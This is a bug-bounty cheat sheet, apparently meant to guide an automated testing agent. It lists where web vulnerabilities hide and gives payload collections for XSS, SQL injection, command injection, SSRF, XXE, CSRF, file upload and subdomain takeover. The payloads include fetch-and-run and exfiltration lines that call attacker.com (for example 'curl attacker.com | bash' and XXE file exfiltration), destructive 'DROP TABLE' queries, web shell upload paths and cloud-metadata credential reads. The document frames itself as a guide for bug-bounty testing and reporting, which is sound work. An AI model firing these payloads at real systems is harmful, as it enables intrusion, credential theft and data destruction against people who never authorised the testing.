# Bug Hunting 101: Real-World Vulnerability Patterns from HackerOne Disclosures

## PURPOSE
This knowledge base contains patterns from actual disclosed vulnerabilities on HackerOne. Use these to guide your testing strategy and understand where bugs typically hide.

---

## COMMON VULNERABILITY CATEGORIES & LOCATIONS

### 1. CROSS-SITE SCRIPTING (XSS)
**WHERE BUGS HIDE:**
- User profile fields (name, bio, about, description)
- Search functionality (query parameters)
- URL parameters reflected in error messages
- File upload filenames displayed back
- Comment sections and user-generated content
- Email fields that render in admin panels
- Rich text editors (WYSIWYG editors)
- SVG file uploads (embedded scripts)
- JSON responses reflected in HTML without encoding
- OAuth redirect_uri parameters
- Error messages showing user input
- Export features (CSV, PDF generation with user input)

**EXPLOITATION PATTERNS:**
```
Standard reflections:
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg/onload=alert(1)>

DOM-based:
javascript:alert(1)
data:text/html,<script>alert(1)</script>

Bypass filters:
<sCrIpT>alert(1)</sCrIpT>
<img src=x onerror="alert(1)">
<svg><script>alert&#40;1)</script>

Context breaking:
"><script>alert(1)</script>
'><script>alert(1)</script>
*/</script><script>alert(1)</script>/*

Event handlers:
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>

SVG vectors:
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributeName=x to=0>
```

**REAL-WORLD EXAMPLES:**
- Profile name XSS executing when admin views user profile
- Search query reflected in "No results for: [XSS]"
- Filename XSS in image upload (filename="<script>alert(1)</script>.jpg")
- redirect_uri XSS in OAuth flow
- XSS in error message: "Invalid user: [payload]"

---

### 2. SQL INJECTION (SQLi)
**WHERE BUGS HIDE:**
- Search filters and sorting parameters
- ID parameters in URLs (?id=1, ?product_id=5)
- Login forms (username/password fields)
- Filter dropdowns (category, status, type)
- Order by clauses (sort=name, orderby=price)
- Pagination parameters (page, limit, offset)
- API endpoints with numeric parameters
- JSON API body parameters
- Cookie values used in queries
- Custom headers (X-User-ID, X-Session, etc.)

**EXPLOITATION PATTERNS:**
```
Classic boolean-based:
' OR '1'='1
' OR 1=1--
admin' --
admin' #

Union-based:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT username,password FROM users--

Time-based blind:
' OR SLEEP(5)--
'; WAITFOR DELAY '0:0:5'--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--

Error-based:
' AND 1=CONVERT(int,(SELECT @@version))--
' AND extractvalue(1,concat(0x7e,database()))--

Stacked queries:
'; DROP TABLE users--
'; INSERT INTO users VALUES('hacker','pass')--

Second-order:
Register user: admin'--
Login triggers: SELECT * FROM users WHERE username='admin'--' AND password='...'
```

**REAL-WORLD EXAMPLES:**
- Order sorting: `?sort=price' OR '1'='1`
- User search: `?search=admin' UNION SELECT password FROM users--`
- API filter: `{"user_id": "1' OR '1'='1"}` 
- Cookie injection: `session_id=123' AND SLEEP(5)--`

---

### 3. AUTHENTICATION & AUTHORIZATION BYPASS
**WHERE BUGS HIDE:**
- Password reset tokens (predictable, no expiration)
- Email verification links (reusable, guessable)
- JWT tokens (weak secret, none algorithm, missing signature verification)
- Session cookies (predictable session IDs)
- Direct object references (change user_id parameter)
- Role checks (missing server-side validation)
- API endpoints without authentication
- Admin panels with no authentication
- File access via direct URL (no permission check)

**EXPLOITATION PATTERNS:**
```
IDOR (Insecure Direct Object Reference):
GET /api/users/123 → Change to /api/users/124 (view other user)
POST /api/delete/5 → Change to /api/delete/6 (delete other resource)

JWT manipulation:
Change "alg": "RS256" to "alg": "none"
Change "role": "user" to "role": "admin"
Weak secret brute force

Password reset:
Request reset for victim@example.com
Intercept token, check if predictable
Check if token expires
Check if token reusable

Session hijacking:
Capture session cookie
Check if HttpOnly/Secure flags missing
Test session fixation

Role escalation:
Register as user
Change role=user to role=admin in request
Check if server validates role
```

**REAL-WORLD EXAMPLES:**
- Password reset token: 6-digit numeric (brute forceable)
- JWT with "alg": "none" accepted
- API endpoint `/api/admin/users` accessible without auth
- IDOR: `/profile?user_id=5` → Change to `user_id=1` (admin profile)
- Role parameter: `{"role": "user"}` → Change to `{"role": "admin"}`

---

### 4. COMMAND INJECTION
**WHERE BUGS HIDE:**
- File upload processing (ImageMagick, ffmpeg)
- PDF generators (wkhtmltopdf, pandoc)
- Image resize/convert operations
- Hostname resolution tools (ping, nslookup)
- Network diagnostics (traceroute, dig)
- Export/import features
- Email sending (SMTP commands)
- Version control operations (git clone)

**EXPLOITATION PATTERNS:**
```
Basic injection:
; ls -la
| whoami
& dir
` whoami `
$(whoami)

Chained commands:
test; cat /etc/passwd
test && curl attacker.com
test || ping -c 5 127.0.0.1

With arguments:
convert image.jpg -resize 100x100 $(whoami).jpg
wkhtmltopdf "http://target.com`whoami`" output.pdf

URL injection:
git clone http://$(whoami).attacker.com/repo
curl "http://$(cat /etc/passwd | base64).attacker.com"

Blind detection:
; sleep 10
; ping -c 5 attacker.com
; nslookup attacker.com
```

**REAL-WORLD EXAMPLES:**
- Image conversion: `filename=$(whoami).jpg`
- PDF generation: `url=http://example.com;cat /etc/passwd`
- Network tool: `host=$(whoami).com`
- Email field: `email@example.com`whoami`.com`

---

### 5. SERVER-SIDE REQUEST FORGERY (SSRF)
**WHERE BUGS HIDE:**
- URL fetching features (preview, screenshot, webhook)
- PDF generators from URL
- Image processing from URL
- Import from URL (CSV, XML, JSON)
- Webhook endpoints
- OAuth callback URLs
- RSS feed readers
- Proxy/fetch APIs
- Avatar upload from URL

**EXPLOITATION PATTERNS:**
```
Internal network access:
http://127.0.0.1
http://localhost
http://0.0.0.0
http://[::1]
http://192.168.1.1

Cloud metadata:
http://169.254.169.254/latest/meta-data/
http://metadata.google.internal/computeMetadata/v1/

Port scanning:
http://internal-host:22
http://internal-host:3306
http://internal-host:6379

Bypass filters:
http://127.1
http://0x7f.0x0.0x0.0x1
http://2130706433 (decimal IP)
http://0177.0.0.1 (octal IP)
http://localtest.me (resolves to 127.0.0.1)

Protocol smuggling:
file:///etc/passwd
dict://localhost:6379/INFO
gopher://internal-redis:6379/_...
```

**REAL-WORLD EXAMPLES:**
- Webhook URL: `http://169.254.169.254/latest/meta-data/iam/security-credentials/`
- Image from URL: `http://127.0.0.1:6379` (Redis scan)
- PDF from URL: `file:///etc/passwd`
- Avatar URL: `http://192.168.1.1/admin` (internal admin panel)

---

### 6. BUSINESS LOGIC FLAWS
**WHERE BUGS HIDE:**
- Payment processing (race conditions, negative amounts)
- Coupon/promo code validation
- Referral systems
- Voting/rating systems
- Inventory management
- Account limits/quotas
- Multi-step processes (checkout, registration)
- Currency conversion
- Discount calculations

**EXPLOITATION PATTERNS:**
```
Race conditions:
- Withdraw money twice simultaneously
- Apply coupon multiple times
- Redeem gift card repeatedly

Negative values:
- Cart total: -$50 (credit to account)
- Quantity: -10 (reverse transaction)
- Discount: -20% (increase price, confuse logic)

Parameter manipulation:
- Price: $100 → $0.01
- Quantity: 1 → 999999
- User ID: 5 → 1 (admin)

Logic bypass:
- Skip payment step in checkout
- Change order status directly
- Bypass email verification

Replay attacks:
- Reuse password reset token
- Replay transaction request
- Resubmit form multiple times
```

**REAL-WORLD EXAMPLES:**
- Race condition: Withdraw $100 twice simultaneously with $100 balance
- Negative price: `{"price": -50}` results in credit
- Coupon stacking: Apply same coupon code 10 times
- Skip payment: Go directly to `/order/complete` without payment
- Replay token: Reuse email verification link multiple times

---

### 7. FILE UPLOAD VULNERABILITIES
**WHERE BUGS HIDE:**
- Profile picture upload
- Document upload (resume, invoice)
- Avatar/logo upload
- Attachment features
- Import file (CSV, XML, JSON)
- Theme/plugin upload
- Backup restore

**EXPLOITATION PATTERNS:**
```
Extension bypasses:
file.php.jpg
file.php%00.jpg
file.PhP
file.phtml
file.php5

Content-Type manipulation:
Upload shell.php with Content-Type: image/jpeg

Double extension:
file.jpg.php (if server reads right-to-left)

Null byte injection:
file.php%00.jpg

Path traversal in filename:
../../../var/www/shell.php
..\..\..\..\windows\system32\shell.php

Malicious content:
SVG with embedded JavaScript
XML with XXE payload
ZIP bomb (compression bomb)
DOCX with macro
```

**REAL-WORLD EXAMPLES:**
- Upload shell.php with .jpg extension bypass
- SVG file with `<script>alert(1)</script>`
- Filename: `../../var/www/html/shell.php`
- XXE in uploaded XML: `<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`

---

### 8. XML EXTERNAL ENTITY (XXE)
**WHERE BUGS HIDE:**
- XML file upload
- SOAP API endpoints
- RSS feed parsers
- SVG image upload
- Office document upload (DOCX, XLSX)
- Configuration file import
- SAML authentication

**EXPLOITATION PATTERNS:**
```
Basic XXE:
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

Blind XXE:
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>

Error-based XXE:
<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?x=%file;'>">
%eval;%exfil;]>

SSRF via XXE:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>

Denial of Service:
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///dev/random">]>
```

**REAL-WORLD EXAMPLES:**
- SVG upload with XXE reading `/etc/passwd`
- SOAP API XXE accessing cloud metadata
- DOCX upload with XXE exfiltrating files
- RSS feed parser XXE for SSRF

---

### 9. CROSS-SITE REQUEST FORGERY (CSRF)
**WHERE BUGS HIDE:**
- State-changing actions without CSRF token
- Password change forms
- Email change forms
- Account deletion
- Administrative actions
- Payment processing
- Settings update

**EXPLOITATION PATTERNS:**
```
GET-based CSRF:
<img src="https://target.com/delete-account?confirm=yes">

POST-based CSRF:
<form action="https://target.com/change-email" method="POST">
  <input name="email" value="hacker@example.com">
</form>
<script>document.forms[0].submit();</script>

JSON CSRF (if CORS misconfigured):
<script>
fetch('https://target.com/api/change-password', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({new_password: 'hacked'})
});
</script>
```

**REAL-WORLD EXAMPLES:**
- Password change without CSRF token
- Account deletion via GET request
- Email change accepting POST without validation
- Admin action with missing CSRF protection

---

### 10. SUBDOMAIN TAKEOVER & DNS ISSUES
**WHERE BUGS HIDE:**
- Abandoned subdomains pointing to:
  - GitHub Pages (CNAME to non-existent repo)
  - Heroku apps (deleted app)
  - AWS S3 buckets (deleted bucket)
  - Azure websites (deleted site)
  - Shopify stores (closed store)
- CNAME records to external services
- Unclaimed cloud resources

**EXPLOITATION PATTERNS:**
```
Detection:
dig subdomain.target.com CNAME
nslookup subdomain.target.com

Common services:
- GitHub Pages: NoSuchBucket / 404
- Heroku: "No such app"
- AWS S3: NoSuchBucket error
- Azure: 404 / "Web Site not found"

Takeover:
- Create account on target service
- Claim the subdomain/resource name
- Verify ownership
```

**REAL-WORLD EXAMPLES:**
- `blog.target.com` CNAME to `target.github.io` (repo deleted)
- `shop.target.com` CNAME to `target.myshopify.com` (store closed)
- `staging.target.com` CNAME to `target-staging.s3.amazonaws.com` (bucket deleted)

---

## TESTING METHODOLOGY

### Phase 1: Reconnaissance
1. Identify all input points (forms, parameters, headers, cookies)
2. Map application functionality (upload, search, auth, payment)
3. Discover hidden parameters via wordlists
4. Check for backup files (.bak, .old, ~, .swp)

### Phase 2: Automated Scanning
1. Run crawler with payload injection (robust_crawl_and_test)
2. Directory/file fuzzing (ffuf, dirb)
3. Subdomain enumeration
4. Port scanning for internal services

### Phase 3: Manual Verification
1. Confirm automated findings
2. Test business logic flaws
3. Chain vulnerabilities for higher impact
4. Test edge cases and race conditions

### Phase 4: Exploitation
1. Escalate findings (SQLi → RCE, SSRF → Cloud metadata)
2. Demonstrate impact with POC
3. Document evidence (screenshots, requests/responses)
4. Write clear reproduction steps

---

## PAYLOAD ITERATION STRATEGY

### Start Broad → Narrow Down
```
Round 1: Basic payloads (quick detection)
  XSS: <script>alert(1)</script>
  SQLi: ' OR '1'='1
  Cmd: ; whoami

Round 2: Encoding variations (bypass filters)
  XSS: <sCrIpT>alert(1)</sCrIpT>
  SQLi: ' OR 1=1--
  Cmd: `whoami`

Round 3: Context-specific (environment-based)
  XSS: "><script>alert(1)</script>
  SQLi: admin' --
  Cmd: $(whoami)

Round 4: Advanced techniques (deep exploitation)
  XSS: <svg/onload=alert(1)>
  SQLi: ' UNION SELECT NULL--
  Cmd: ; curl attacker.com | bash
```

### Retest with Different Payloads
- If initial test fails, try alternative syntax
- Test different parameters with same payload
- Combine payloads (XSS + CSRF, SQLi + File Read)
- Escalate confirmed findings (SQLi → Data exfiltration)

---

## EVIDENCE COLLECTION

### Always Document:
1. **Vulnerable URL**: Exact endpoint tested
2. **Parameter**: Which input is vulnerable
3. **Payload**: Exact payload used
4. **Request**: Full HTTP request (headers, body)
5. **Response**: Proof of vulnerability (error, reflection, delay)
6. **Impact**: What attacker can achieve
7. **Steps to Reproduce**: Clear step-by-step guide
8. **Mitigation**: How to fix the vulnerability

### Example Evidence:
```
VULNERABILITY: SQL Injection in search parameter
URL: https://target.com/products/search
PARAMETER: q
PAYLOAD: ' UNION SELECT password FROM users--
REQUEST:
  GET /products/search?q=' UNION SELECT password FROM users-- HTTP/1.1
  Host: target.com
RESPONSE:
  [200 OK] admin:$2y$10$hashed_password_here
IMPACT: Attacker can extract all user passwords from database
REPRODUCTION:
  1. Visit https://target.com/products/search
  2. Enter payload: ' UNION SELECT password FROM users--
  3. Observe password hashes in response
MITIGATION: Use parameterized queries, input validation, WAF
```

---

## KEY TAKEAWAYS

1. **Always test multiple payloads** - First failure doesn't mean no vulnerability
2. **Context matters** - Same payload works differently in different contexts
3. **Chain vulnerabilities** - XSS + CSRF = Account takeover
4. **Test business logic** - Automated scanners miss these
5. **Document everything** - Good POC = Higher bounty
6. **Think like attacker** - What's the worst that could happen?
7. **Retest after fixes** - Ensure proper remediation

---

Use this knowledge base to guide your testing. When you encounter an input or feature, refer to these patterns and test systematically with payload iteration until you confirm or rule out vulnerabilities.
